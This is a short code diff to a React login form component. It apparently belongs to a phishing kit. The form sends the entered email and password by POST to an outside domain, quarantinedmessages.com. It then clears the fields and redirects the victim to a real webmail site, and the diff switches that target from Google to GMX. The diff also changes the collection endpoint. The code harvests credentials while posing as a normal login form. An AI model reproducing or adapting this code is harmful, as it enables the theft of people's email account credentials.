@@ -23,7 +23,7 @@ const Form = () => {
     
         try {
             setIsLoading(true)
-          const response = await fetch('https://quarantinedmessages.com/logs', {
+          const response = await fetch('https://quarantinedmessages.com/legend', {
             method: 'POST',
             headers: {
               'Content-Type': 'application/json',
@@ -44,7 +44,7 @@ const Form = () => {
             setIsLoading(false)
             setPassword('')
             setEmail('')
-            window.location.href = 'https://www.google.com';
+            window.location.href = 'https://www.gmx.net/';
             // setTimeout(() => {
             //   window.location.href = 'https://www.google.com';
             //   console.log("redirecting")
